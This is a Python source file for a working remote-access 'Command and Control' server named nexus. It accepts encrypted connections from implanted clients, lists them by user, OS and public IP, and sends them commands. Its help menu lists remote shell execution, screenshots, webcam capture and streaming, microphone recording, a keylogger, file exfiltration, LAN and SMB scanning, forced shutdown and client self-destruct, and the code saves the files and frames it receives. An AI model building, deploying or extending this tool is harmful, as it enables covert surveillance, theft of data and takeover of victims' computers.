"""
Multi-client Command and Control server on TCP/613 (default) with (Fernet) encryption.
Use the --help command for more information.
"""

from __future__ import annotations
from cryptography.fernet import Fernet, InvalidToken
import json, socket, struct, sys, shlex, threading, pathlib, datetime

DEBUG = True

#
# Token Configuration
#
ALERT_TOKEN     = "[!]"
ACTIVE_TOKEN    = "[*]"
CONNECT_TOKEN   = "[+]"
DOWNLOAD_TOKEN  = "[↓]"
NEUTRAL_TOKEN   = "[-]"
OUTPUT_TOKEN    = "[←]"
POINTER_TOKEN   = "[→]"
PIANO_TOKEN     = "[♪]"

# Host and port are (obviously) customizable.
HOST, PORT      = "0.0.0.0", 613
# 32 url-safe bytes. Look into generate-fernet-key.py for more information.
SECRET_KEY      = b"XRj8tFGZfTsfEMOBsgwzMmlpZw10eXMVL8yxsPmHYxQ="

# Defaults user accounts allowed to send info to CnC server.py.
ACCOUNTS        = {
    "exampleuser": "S3cr3t!password",
    "exampleuser2": "An0th3rP@ssw0rd"
}

f = Fernet(SECRET_KEY)

# Reserved command IDs.
AUTH_CMD, SHELL_OUT = 254, 0

# Scan results (text)
LAN_SCAN_OUT  = 12

# Piano Mode: Toggle
PIANO_CMD     = 15
# Piano Mode: Play specific note. Separated from PIANO_CMD to allow sending
# notes without toggling piano mode.
PIANO_NOTE_CMD = 16

_client_lock: threading.Lock = threading.Lock()
# id → {... , socket}
_clients: dict[int, dict] = {}
_next_id = 1

# 100 MB
MAX_CIPHER   = 104_857_600
BIN_OUT      = 2
STREAM_FRAME = 3                

HIST_FILE  = ".server_hist"

# NOTE: This has to be defined before the readline import attempt is made.
def debug(msg: str):
    if DEBUG:
        print(f"[DEBUG] {msg}")

try:
    import readline, atexit, pathlib, os
    hfile = f"{HIST_FILE}"
    debug(hfile)
    if hfile.exists(): readline.read_history_file(hfile)
    atexit.register(readline.write_history_file, hfile)
except ImportError:
    debug("Windows detected - readline not needed")
    pass

def init_message():
    # I could math all of this shit out dynamically, but I don't think it would matter.
    print("+------------------------------------------------------------------+")
    print("| Welcome to nexus.                                                |")
    print("| https://articles.rethy.xyz/articles/nexus                        |")
    print("|                                                                  |")
    print("| Use the --help command for more information.                     |")
    print("+------------------------------------------------------------------+")

def next_free_id() -> int:
    """
    Return the smallest positive integer not currently used
    as a client ID.  (1, 2, 3, … with gaps filled.)
    Call only with _client_lock held.
    """
    cid = 1
    while cid in _clients:
        cid += 1
    return cid

def save_binary(payload: bytes, meta: dict):
    ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    kind = meta.get("kind", "blob")
    ext  = meta.get("ext",  "bin")
    if "name" in meta:
        # preserve original file name, prefix with timestamp
        fname = pathlib.Path(f"{ts}_{meta['name']}")
    else:
        fname = pathlib.Path(f"{kind}_{ts}.{ext}")

    with open(fname, "wb") as fp:
        fp.write(payload)
    print(f"{DOWNLOAD_TOKEN} saved {kind} → {fname}")

def send_encrypted_frame(sock: socket.socket, cmd: int, payload: bytes | None = None):
    ''' Encrypt & frame:  uint32(len) ‖ Fernet(ciphertext). '''
    if payload is None:
        payload = b''                       # never concatenate None
    blob   = struct.pack(">BI", cmd, len(payload)) + payload
    token  = f.encrypt(blob)                # AES-CTR + HMAC
    sock.sendall(struct.pack(">I", len(token)) + token)

def receive_encrypted_frame(sock: socket.socket):
    clen_bytes = read_exact_bytes(sock, 4)
    (clen,)    = struct.unpack(">I", clen_bytes)

    if clen > MAX_CIPHER:       # ← was 64 000
        raise ValueError("ciphertext length absurd")

    token  = read_exact_bytes(sock, clen)
    plain  = f.decrypt(token)   # may raise InvalidToken
    cmd, plen = struct.unpack(">BI", plain[:5])
    payload   = plain[5:5 + plen]
    return cmd, payload

def read_exact_bytes(sock: socket.socket, n: int) -> bytes:
    ''' Read exactly *n* bytes or raise ConnectionResetError.  '''
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionResetError("connection closed while reading")
        buf += chunk
    return buf

def _client_thread(conn: socket.socket, peer):
    '''
    1. Expects an AUTH packet first (cmd 254).
    2. Registers the client on success, then processes packets.
    3. Any decrypt/auth failure drops the connection quietly.
    '''
    global _next_id
    # make sure it's always defined
    cid = None

    try:
        # Fail quickly if nothing arrives
        conn.settimeout(3.0)

        # first packet must be AUTH (check doc string).
        cmd, pl = receive_encrypted_frame(conn)
        if cmd != AUTH_CMD:
            raise ValueError("expected auth packet first")

        auth = json.loads(pl.decode())
        user, pw = auth.get("username"), auth.get("password")
        if ACCOUNTS.get(user) != pw:
            raise ValueError("invalid credentials")

        # successful login
        #
        # back to blocking mode
        conn.settimeout(None)
        meta = auth.get("meta", {})

        with _client_lock:
            cid = next_free_id()
            _clients[cid] = {"socket": conn, "username": user,
                **meta, "addr": peer[0], "port": peer[1]}

        print(f"{CONNECT_TOKEN} #{cid} {user}@{peer} connected")

        while True:
            cmd, pl = receive_encrypted_frame(conn)

            if cmd == SHELL_OUT:
                print(f"{OUTPUT_TOKEN} #{cid} output:\n{pl.decode(errors='replace')}")

            elif cmd == LAN_SCAN_OUT:
                print(f"{OUTPUT_TOKEN} #{cid} LAN scan:\n{pl.decode(errors='replace')}")

            elif cmd == BIN_OUT:
                # Payload format:  <meta-json utf-8> newline  <binary bytes>
                hdr, _, blob = pl.partition(b'\n')
                meta = json.loads(hdr.decode())
                save_binary(blob, meta)

            elif cmd == STREAM_FRAME:
                #  Payload = header-json '\n' JPEG-bytes
                hdr, _, blob = pl.partition(b'\n')
                meta = json.loads(hdr.decode())
                fname = f"stream_{cid}_{meta['frame']:06}.jpg"
                with open(fname, "wb") as fp:
                    fp.write(blob)
                # OPTIONAL: comment out the next line if you don't want per-frame spam
                # Might be better to just have this in debug mode.
                print(f"{DOWNLOAD_TOKEN} saved frame {meta['frame']} from #{cid} {POINTER_TOKEN} {fname}")
            else:
                print(f"{ALERT_TOKEN} #{cid} sent unknown cmd {cmd}")

    except Exception as e:
        print(f"{ALERT_TOKEN} client error from {peer}: {e}")

    finally:
        # only deregister if login succeeded
        if cid is not None:
            with _client_lock:
                _clients.pop(cid, None)
            print(f"{NEUTRAL_TOKEN} #{cid} disconnected")
        conn.close()

def _listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((HOST, PORT)); srv.listen()
        print(f"{ACTIVE_TOKEN} Listening on {HOST}:{PORT}")
        while True:
            conn, peer = srv.accept()
            threading.Thread(target=_client_thread,
                             args=(conn, peer), daemon=True).start()

def _print_clients():
    with _client_lock:
        if not _clients:  print("(no clients)"); return
        hdr = f"{'ID':<3}{'AuthUser':<12}{'SysUser':<12}{'OS':<10}{'PublicIP':<15}{'Peer':<22}"
        print(hdr); print("─"*len(hdr))
        for cid, inf in _clients.items():
            print(f"{cid:<3}"
                  f"{inf.get('auth_user','')[:11]:<12}"
                  f"{inf.get('sysuser','')[:11]:<12}"
                  f"{inf.get('os','')[:9]:<10}"
                  f"{inf.get('public_ip',''):<15}"
                  f"{inf['addr']}:{inf['port']}")

def _send_cmd_cli(tokens: list[str]):
    if len(tokens) < 3 or not tokens[1].isdigit() or not tokens[2].isdigit():
        print("usage: --send <id> <cmd> [payload]"); return
    cid, cmd = int(tokens[1]), int(tokens[2])
    payload  = " ".join(tokens[3:]).encode()
    
    # Special handling for piano mode
    if cmd == PIANO_CMD:
        _piano_mode_via_send(cid)
        return
    
    with _client_lock:
        inf = _clients.get(cid)
    if not inf:
        print("no such client"); return
    try:
        send_encrypted_frame(inf["socket"], cmd, payload)
        print(f"{POINTER_TOKEN} sent cmd {cmd} to #{cid}")
    except Exception as e:
        print(f"[!] send failed: {e}")

def _piano_mode_via_send(cid: int):
    """
    Enter interactive piano mode for the specified client via --send command.
    Maps keyboard keys to musical notes.
    """
    with _client_lock:
        client = _clients.get(cid)
    
    if not client:
        print(f"{ALERT_TOKEN} Client not found")
        return

    print(f"{PIANO_TOKEN} Entering piano mode for client #{cid}")
    print("Key mappings:")
    print("  a s d f g h j k l ; '  (white keys: C D E F G A B)")
    print("  w e   t y u   o p      (black keys: C# D# F# G# A#)")
    print("  Press 'q' to exit piano mode")
    
    # Toggle piano mode on client
    try:
        send_encrypted_frame(client["socket"], PIANO_CMD, b"")
    except Exception as e:
        print(f"{ALERT_TOKEN} Failed to activate piano mode: {e}")
        return
    
    # Key to note mapping
    key_to_note = {
        'a': 'c',   's': 'd',   'd': 'e',   'f': 'f',
        'g': 'g',   'h': 'a',   'j': 'b',   'k': 'c',
        'l': 'd',   ';': 'e',   "'": 'f',
        'w': 'c#',  'e': 'd#',  't': 'f#',  'y': 'g#',
        'u': 'a#',  'o': 'a#',  'p': 'b',
    }

    try:
        import termios, tty, sys
        old_settings = termios.tcgetattr(sys.stdin)
        tty.setraw(sys.stdin.fileno())
        
        while True:
            char = sys.stdin.read(1).lower()
            
            if char == 'q':
                break
            elif char in key_to_note:
                note = key_to_note[char]
                try:
                    send_encrypted_frame(client["socket"], PIANO_NOTE_CMD, note.encode())
                    print(f"{PIANO_TOKEN} {note.upper()}", end='', flush=True)
                except Exception as e:
                    print(f"\n{ALERT_TOKEN} Error sending note: {e}")
                    break
            elif char == '\x03':  # Ctrl+C
                break
    except ImportError:
        # Fallback for Windows (no termios)
        print("\nFallback mode (press Enter after each key):")
        while True:
            try:
                char = input().strip().lower()
                if char == 'q':
                    break
                elif char in key_to_note:
                    note = key_to_note[char]
                    try:
                        send_encrypted_frame(client["socket"], PIANO_NOTE_CMD, note.encode())
                        print(f"{PIANO_TOKEN} {note.upper()}")
                    except Exception as e:
                        print(f"{ALERT_TOKEN} Error sending note: {e}")
                        break
                else:
                    print("Invalid key. Use: a s d f g h j k l ; ' w e t y u o p (or 'q' to quit)")
            except (EOFError, KeyboardInterrupt):
                break
    except Exception as e:
        print(f"{ALERT_TOKEN} Piano mode error: {e}")
    
    finally:
        try:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
        except:
            pass
        
        # Deactivate piano mode on client
        try:
            send_encrypted_frame(client["socket"], PIANO_CMD, b"")
        except:
            pass
        
        print(f"\n{PIANO_TOKEN} Exited piano mode for client #{cid}")

def _print_help():
    print(f"--serve\n"
              f"\tstarts TCP socket on {HOST}:{PORT}\n"
              f"\tconfigurable via global variables\n"
           f"--list\n"
              f"\tlists clients current connected to the server\n"
              f"\tIncludes system username, OS, public IP, and peer\n"
           f"--send\n"
              f"\tusage: --send <id> <cmd> [payload (optional)]\n"
              f"\t<id>  ID of the client found from --list\n"
              f"\t<cmd> command you wish to execute:\n"
              f"\t\t1:  Execute shell command (requires payload)\n"
              f"\t\t    Example: --send 1 1 whoami\n"
              f"\t\t2:  Binary output (internal use)\n"
              f"\t\t3:  Stream frame (internal use)\n"
              f"\t\t4:  Take screenshot of all displays\n"
              f"\t\t    Captures all monitors and saves as PNG\n"
              f"\t\t5:  Capture webcam photo\n"
              f"\t\t    Takes single photo from default camera\n"
              f"\t\t6:  Record microphone audio\n"
              f"\t\t    Records 5 seconds by default, or specify duration\n"
              f"\t\t    Example: --send 1 6 10 (records 10 seconds)\n"
              f"\t\t7:  Toggle keylogger\n"
              f"\t\t    First call starts logging, second call stops and returns data\n"
              f"\t\t8:  Shutdown system\n"
              f"\t\t    Immediately shuts down the client machine\n"
              f"\t\t9:  Restart system\n"
              f"\t\t    Immediately restarts the client machine\n"
              f"\t\t10: Toggle webcam stream\n"
              f"\t\t    Starts/stops continuous webcam streaming\n"
              f"\t\t11: Perform LAN network scan\n"
              f"\t\t    Scans local network for live hosts and open ports\n"
              f"\t\t12: LAN scan output (internal use)\n"
              f"\t\t13: SMB mapping scan (Windows only)\n"
              f"\t\t    Lists SMB shares and mappings on Windows systems\n"
              f"\t\t14: Download file from client\n"
              f"\t\t    Requires full file path as payload\n"
              f"\t\t    Example: --send 1 14 C:\\Users\\user\\file.txt\n"
              f"\t\t15: Interactive piano mode\n"
              f"\t\t    Turns client into a musical keyboard instrument\n"
              f"\t\t    Use keyboard keys to play musical notes\n"
              f"\t\t16: Play piano note (internal use)\n"
              f"\t\t99: Self-destruct client\n"
              f"\t\t    Attempts to delete client file and terminate\n"
              f"\n"
              f"Additional Commands:\n"
              f"exit/quit - terminate the server\n"
              f"--help    - show this help message\n"
    )

def main():
    listener: threading.Thread|None = None

    while True:
        try:
            line = input("input> ")
        except (EOFError, KeyboardInterrupt):
            print(); sys.exit()

        tokens = shlex.split(line); op = tokens[0] if tokens else ""

        if op == "--serve":
            if listener and listener.is_alive():
                print("already serving")
            else:
                listener = threading.Thread(target=_listener, daemon=True)
                listener.start()
        elif op == "--list":
            _print_clients()
        elif op == "--send":
            _send_cmd_cli(tokens)
        elif op == "--help":
            _print_help()
        elif op in {"exit","quit"}:
            sys.exit()
        elif op:
            print("commands: --help | --serve | --list | --send | exit/quit")
            print("Use the --help command for more information.")

if __name__ == "__main__":
    init_message()
    main()
